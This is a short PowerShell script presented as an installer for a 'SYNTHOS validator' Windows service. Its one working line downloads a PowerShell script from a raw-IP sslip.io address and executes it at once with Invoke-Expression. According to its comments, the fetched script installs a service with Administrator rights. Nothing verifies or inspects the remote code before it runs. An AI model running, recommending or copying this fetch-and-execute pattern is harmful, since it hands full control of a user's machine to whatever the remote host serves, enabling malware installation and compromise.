# SYNTHOS validator service installer
# Delegates to the live backend installer, which installs SynthosNode as an
# Administrator Windows Service and starts real Ed25519 signed heartbeats.
$ErrorActionPreference = "Stop"
$base = "https://82-29-54-7.sslip.io"
Invoke-Expression (Invoke-RestMethod "$base/api/node/windows-installer.ps1")
